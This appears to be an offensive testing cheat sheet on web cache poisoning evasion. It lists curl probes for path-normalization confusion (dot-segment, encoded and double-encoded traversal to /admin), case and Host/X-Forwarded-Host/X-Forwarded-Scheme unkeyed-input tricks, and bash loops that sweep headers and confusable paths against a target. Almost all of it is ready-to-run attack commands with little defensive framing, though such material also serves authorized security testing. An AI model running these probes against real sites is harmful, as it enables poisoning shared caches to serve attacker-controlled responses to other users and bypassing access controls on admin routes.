# Evasion — cache-poisoning bypass and normalization tricks

The bypasses — the normalization boundaries and the keyed-input defeats.

---

## 1. The path-normalization boundary — a route confusion

```bash
# a path the cache and the app normalize differently
curl "$BASE/static/../admin?cb=<unique>"        # the cache stores it under the
                                                # static-looking key; the app
                                                # serves /admin
curl "$BASE/static/../admin?cb=<unique>"        # HIT? the stored copy's response
# variants
curl "$BASE/%2e%2e/admin?cb=<unique>"           # an encoded path
curl "$BASE/static/%2e%2e/admin?cb=<unique>"    # a mixed-encoding path
```

```text
the cache normalizes the path one way; the app routes it another —
the stored copy's URL is the victim's URL, the response is YOUR
request's.
```

## 2. The keyed-input defeat — a cache-buster

```bash
# a keyed param the app ignores — a fresh entry, not a poisoned one
curl "$BASE/page?cb=<unique>&_=<random>" -H 'X-Forwarded-Host: <marker>'
# the stored copy is keyed per-_ — a fresh entry each value
```

```text
a keyed param the app ignores is a cache-buster — it defeats the
poisoning by keying the entry per-value.
```

## 3. The Vary-header defeat — a keyed header

```bash
# a Vary: X-Custom — the cache keys on X-Custom
curl "$BASE/page?cb=<unique>" -H 'X-Custom: <marker>'
#   the stored copy is keyed per-X-Custom — a per-input entry — not poisonable
```

## 4. The case-normalization — a case-sensitive key

```bash
# a path the cache stores case-sensitively but the app routes case-
# insensitively — a case-normalization boundary
curl "$BASE/Page?cb=<unique>"   # the cache stores under /Page; the app serves /
curl "$BASE/Page?cb=<unique>"   # HIT? the stored copy's response
```

## 5. The double-encoding — a doubly-encoded path

```bash
# a doubly-encoded path — the cache decodes once; the app decodes again
curl "$BASE/%252e%252e/admin?cb=<unique>"
#   the cache stores it under %252e%252e; the app serves /admin
```

## 6. The param-keying normalization — a stripped param

```nginx
# a config that strips a param — an unkeyed param
proxy_cache_key $scheme$proxy_host$uri;   # $uri drops the query → the params unkeyed
```

## 7. The Host-normalization — a keyed-vs-unkeyed host

```bash
# the Host — check it's in the key
curl "$BASE/page?cb=<unique>" -H 'Host: <marker>'
# or an X-Forwarded-Host — a different input
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: <marker>'
```

## 8. The scheme-normalization — a keyed-vs-unkeyed scheme

```bash
# an X-Forwarded-Scheme — the app's URLs use YOUR scheme
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Scheme: <marker>'
```

## 9. The unkeyed-input bypass — a keyed-vs-unkeyed confusion

```text
the whole attack depends on a request part the app reads but the
cache ignores. the bypasses:
- a keyed param the app ignores → a cache-buster (a fresh entry)
- a Vary'd header → a keyed header (a per-input entry)
- a path the cache normalizes → a route confusion (a keyed-vs-routed
  difference)
- a stripped param → an unkeyed param (a poisonable input)
```

## 10. The unkeyed-input sweep — find one the cache ignores

```bash
# for each candidate input — send it → check the stored copy
for h in 'X-Forwarded-Host' 'X-Original-URL' 'X-Rewrite-URL' 'X-Forwarded-Scheme' 'X-Host' 'User-Agent' 'Referer' 'Accept-Language' 'Accept-Charset' 'Accept' 'X-Forwarded-Server' 'X-Real-IP'; do
  curl "$BASE/page?cb=<unique>" -H "$h: <marker>"
  curl "$BASE/page?cb=<unique>" | grep '<marker>' && echo "$h UNKEYED"
done
```

## 11. The unkeyed-input falsifier — when nothing is unkeyed

```text
every candidate input IS keyed → no unkeyed input → no poisoning
vector → a different class. the whole attack depends on a request
part the app reads but the cache ignores — none means a different
class.
```

## 12. The keyed-input falsifier — a per-input entry

```text
a keyed input isn't poisonable — a different requester gets a
different key — the stored copy is yours. record it: 'the <input>
IS keyed — a per-input entry — not a shared poisoning'.
```

## 13. The cache-buster's use — a unique keyed param per probe

```bash
# a cache-buster you control — a unique keyed param per probe
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: <marker>'  # stored under /page?cb=<unique>
```

```text
a keyed param you control is the cache-buster for the POISONING
request — a unique key per probe — the stored copy is YOUR probe's.
```

## 14. The normalization-boundary sweep — the confusable paths

```bash
# for each normalization boundary — the cache-vs-app path difference
for p in '/static/../admin' '/%2e%2e/admin' '/static/%2e%2e/admin' '/Page' '/page/' '/page//admin' '/page.%2f' '/%2f/admin'; do
  curl "$BASE$p?cb=<unique>"
done
```
